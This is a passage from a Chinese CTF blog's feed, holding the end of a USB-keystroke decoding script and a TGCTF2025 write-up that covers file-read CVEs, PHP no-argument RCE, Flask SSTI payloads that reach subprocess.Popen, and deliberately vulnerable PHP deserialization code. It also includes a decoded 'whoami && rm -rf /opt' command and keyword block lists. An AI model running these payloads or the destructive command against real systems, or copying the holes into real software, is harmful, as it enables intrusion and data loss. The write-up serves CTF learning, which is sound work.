class="string">&#x27;Paste&#x27;</span>, <span class="number">0x7D</span>: <span class="string">&#x27;Find&#x27;</span>, <span class="number">0x7E</span>: <span class="string">&#x27;Mute&#x27;</span>, <span class="number">0x7F</span>: <span class="string">&#x27;Volume Up&#x27;</span>,</span><br><span class="line">     <span class="number">0x80</span>: <span class="string">&#x27;Volume Down&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_usb_keyboard_data</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        bytes_data = <span class="built_in">bytes</span>.fromhex(data.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">        keys = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="built_in">len</span>(bytes_data)):</span><br><span class="line">            keycode = bytes_data[i]</span><br><span class="line">            <span class="keyword">if</span> keycode <span class="keyword">in</span> KEYCODE_MAP:</span><br><span class="line">                keys.append(KEYCODE_MAP[keycode])</span><br><span class="line">        <span class="keyword">return</span> keys</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;输入的不是有效的十六进制字符串&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">                line = line.strip()</span><br><span class="line">                decoded_keys = decode_usb_keyboard_data(line)</span><br><span class="line">                <span class="keyword">if</span> decoded_keys:</span><br><span class="line">                    s+=<span class="string">&#x27;&#x27;</span>.join(decoded_keys)</span><br><span class="line">            <span class="built_in">print</span>(s)</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;文件 out.txt 不存在&quot;</span>)</span><br><span class="line"><span class="comment">#whoami 77 rm -rf Caps Lockopt</span></span><br></pre></td></tr></table></figure><p>whoami &amp;&amp; rm -rf &#x2F;opt</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 能源安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF2025 Writeup+复现</title>
      <link href="/posts/4260fda8/"/>
      <url>/posts/4260fda8/</url>
      
        <content type="html"><![CDATA[<blockquote><p>跟w8nn9z和1n1t组队打的，这次其他方向也是硬扛出了一点……</p><p>很好的新生赛，使我开始学web()</p></blockquote><h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/TGCTF2025Writeup.pdf">Writeup</a></h4><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="你能发现图片里的秘密吗"><a href="#你能发现图片里的秘密吗" class="headerlink" title="你能发现图片里的秘密吗"></a>你能发现图片里的秘密吗</h4><p>对给的图片zsteg就能找到7z的密码</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415151311939.png" alt="image-20250415151311939"></p><p>先看一下png，发现结尾的IDAT块在上一个没填满的情况下就开始了，单独把这个IDAT块拿出来保存成png</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415154312488.png" alt="image-20250415154312488"></p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415154438788.png" alt="image-20250415154438788"></p><p>看起来宽高有点问题，用puzzlesolver爆破一下正确的宽高修复一下，得到flag1</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415155341328.png" alt="image-20250415155341328"></p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415155420288.png" alt="image-20250415155420288"></p><p>根据官方wp，pdf放进ps里面可以看到第二个图层，把上面那张图移开就能看到flag。但是复现网站给的附件好像有点问题，没有第二个图层。</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415161327830.png" alt="image-20250415161327830"></p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="前端Game-Plus"><a href="#前端Game-Plus" class="headerlink" title="前端Game-Plus"></a>前端Game-Plus</h4><p>还是跟之前一样找到flag的路径，用<a href="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&mid=2247483811&idx=1&sn=2b4403023fd911f611bf5590ea3796d6&scene=21#wechat_redirect">CVE-2025-31486</a>进行任意文件读取</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415182429761.png" alt="image-20250415182429761"></p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415182817375.png" alt="image-20250415182817375"></p><h4 id="前端Game-Ultra"><a href="#前端Game-Ultra" class="headerlink" title="前端Game Ultra"></a>前端Game Ultra</h4><p>还是跟之前一样找到flag的路径，用<a href="https://mp.weixin.qq.com/s/HMhzXqSplWa-IwpftxwTiA">CVE-2025-32395</a>进行任意文件读取</p><p>这题给出了附件，从dockerfile可以看出workdir是&#x2F;app，多试几次目录穿越到根目录读flag就行</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415183956367.png" alt="image-20250415183956367"></p><h4 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h4><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$tgctf2025</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;tgctf2025&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\|localeconv|pos|current|print|var|dump|getallheaders|get|defined|str|split|spl|autoload|extensions|eval|phpversion|floor|sqrt|tan|cosh|sinh|ceil|chr|dir|getcwd|getallheaders|end|next|prev|reset|each|pos|current|array|reverse|pop|rand|flip|flip|rand|content|echo|readfile|highlight|show|source|file|assert/i&quot;</span>, <span class="variable">$tgctf2025</span>))&#123;</span><br><span class="line">    <span class="comment">//hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$tgctf2025</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实际上仍然是无参rce，用session_start启用sessionid，然后把恶意代码写在sessionid里就行</p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415192352015.png" alt="image-20250415192352015"></p><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415192422174.png" alt="image-20250415192422174"></p><h4 id="直面天命（复仇）"><a href="#直面天命（复仇）" class="headerlink" title="直面天命（复仇）"></a>直面天命（复仇）</h4><p>前面都跟直面天命那题一样，只不过这里aazz路由是直接给出的源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string, jsonify, send_from_directory</span><br><span class="line"><span class="keyword">from</span> a.b.c.d.secret <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">black_list=[<span class="string">&#x27;lipsum&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;map&#x27;</span>,<span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&quot;url&quot;</span>, <span class="string">&#x27;pop&#x27;</span>,<span class="string">&#x27;include&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;read&#x27;</span>,<span class="string">&#x27;base&#x27;</span>,<span class="string">&#x27;globals&#x27;</span>,<span class="string">&#x27;_.&#x27;</span>,<span class="string">&#x27;set&#x27;</span>,<span class="string">&#x27;application&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;arg&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> name.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_typable</span>(<span class="params">char</span>):</span><br><span class="line">    <span class="comment"># 定义可通过标准 QWERTY 键盘输入的字符集</span></span><br><span class="line">    typable_chars = string.ascii_letters + string.digits + string.punctuation + string.whitespace</span><br><span class="line">    <span class="keyword">return</span> char <span class="keyword">in</span> typable_chars</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(<span class="string">&#x27;static&#x27;</span>, <span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/jingu&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">greet</span>():</span><br><span class="line">    template1=<span class="string">&quot;&quot;</span></span><br><span class="line">    template2=<span class="string">&quot;&quot;</span></span><br><span class="line">    name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> waf(name):</span><br><span class="line">        template = <span class="string">&#x27;想干坏事了是吧hacker？哼，还天命人，可笑，可悲，可叹</span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">if</span> is_typable(i):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            k=<span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> k==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (secret_key[:<span class="number">2</span>] <span class="keyword">in</span> name <span class="keyword">and</span> secret_key[<span class="number">2</span>:]):</span><br><span class="line">                template = <span class="string">&#x27;连“六根”都凑不齐，谈什么天命不天命的，还是戴上这金箍吧</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">再去西行历练历练</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line">            template1 = <span class="string">&quot;“六根”也凑齐了，你已经可以直面天命了！我帮你把“secret_key”替换为了“&#123;&#123;&#125;&#125;”</span></span><br><span class="line"><span class="string">最后，如果你用了cat，就可以见到齐天大圣了</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">            template= template.replace(<span class="string">&quot;天命&quot;</span>,<span class="string">&quot;&#123;&#123;&quot;</span>).replace(<span class="string">&quot;难违&quot;</span>,<span class="string">&quot;&#125;&#125;&quot;</span>)</span><br><span class="line">            template = template</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> template:</span><br><span class="line">        template2 = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">或许你这只叫天命人的猴子，真的能做到？</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Image&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> template1+render_template_string(template)+render_template_string(template2)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="string">f&quot;500报错了，查询语句如下：</span></span><br><span class="line"><span class="string"><span class="subst">&#123;template&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">return</span> error_message, <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hinter</span>():</span><br><span class="line">    template=<span class="string">&quot;hint：</span></span><br><span class="line"><span class="string">有一个aazz路由，去那里看看吧，天命人!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/aazz&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finder</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        source_code = f.read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;</span></span><br><span class="line"><span class="string"><span class="subst">&#123;source_code&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span>, <span class="number">200</span>, &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>在上面一题中我们可以读&#x2F;a&#x2F;b&#x2F;c&#x2F;d&#x2F;secret.py得到secretkey是直面天命</p><p>再看代码，天命被替换成了，所以在天命和难违之间写我们的payload就行。</p><p>先看一下有哪些类可以用</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()</span><br></pre></td></tr></table></figure><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415202837946.png" alt="image-20250415202837946"></p><p>这里我们用subprocess.Popen这个类，其下标为351，先看一下flag叫什么</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[351]([&#x27;ls&#x27;,&#x27;/&#x27;],stdout=-1).communicate()[0]</span><br></pre></td></tr></table></figure><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415203751321.png" alt="image-20250415203751321"></p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[][&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fmro\x5f\x5f&quot;][1][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()[351]([&#x27;cat&#x27;,&#x27;/tgffff11111aaaagggggggg&#x27;],stdout=-1).communicate()[0]</span><br></pre></td></tr></table></figure><p><img src="/images/TGCTF2025-Writeup-%E5%A4%8D%E7%8E%B0/image-20250415204932832.png" alt="image-20250415204932832"></p><h4 id="什么文件上传（复仇）"><a href="#什么文件上传（复仇）" class="headerlink" title="什么文件上传（复仇）"></a>什么文件上传（复仇）</h4><p>前面的部分跟原来那题还是一样，读robots.txt，爆破出可以上传的文件后缀名是atg，读class.php</p><p>class.php源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">best64_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>))));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yesterday</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$learn</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$study</span>=<span class="string">&quot;study&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$try</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;learn = <span class="string">&quot;learn&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You studied hard yesterday.&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;study-&gt;<span class="title function_ invoke__">hard</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">today</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$doing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$did</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$done</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;did = <span class="string">&quot;What you did makes you outstanding.&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;done = <span class="string">&quot;And what you&#x27;ve done has given you a choice.&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;done;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;doing))==<span class="number">666</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">doing</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;doing-&gt;better;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tommoraw</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$good</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$bad</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$soso</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;good=<span class="string">&quot;You&#x27;ll be good tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;good;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;bad=<span class="string">&quot;You&#x27;ll be bad tommoraw!&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">future</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$impossible</span>=<span class="string">&quot;How can you get here?&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$out</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$no</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$useful1</span>;<span class="keyword">public</span> <span class="variable">$useful2</span>;<span class="keyword">public</span> <span class="variable">$useful3</span>;<span class="keyword">public</span> <span class="variable">$useful4</span>;<span class="keyword">public</span> <span class="variable">$useful5</span>;<span class="keyword">public</span> <span class="variable">$useful6</span>;<span class="keyword">public</span> <span class="variable">$useful7</span>;<span class="keyword">public</span> <span class="variable">$useful8</span>;<span class="keyword">public</span> <span class="variable">$useful9</span>;<span class="keyword">public</span> <span class="variable">$useful10</span>;<span class="keyword">public</span> <span class="variable">$useful11</span>;<span class="keyword">public</span> <span class="variable">$useful12</span>;<span class="keyword">public</span> <span class="variable">$useful13</span>;<span class="keyword">public</span> <span class="variable">$useful14</span>;<span class="keyword">public</span> <span class="variable">$useful15</span>;<span class="keyword">public</span> <span class="variable">$useful16</span>;<span class="keyword">public</span> <span class="variable">$useful17</span>;<span class="keyword">public</span> <span class="variable">$useful18</span>;<span class="keyword">public</span> <span class="variable">$useful19</span>;<span class="keyword">public</span> <span class="variable">$useful20</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg1</span>, <span class="variable">$arg2</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;out-&gt;useful7) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Seven is my lucky number&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;This is your future.&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&quot;wow&quot;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;win&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;no = <span class="string">&quot;no&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;no;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span 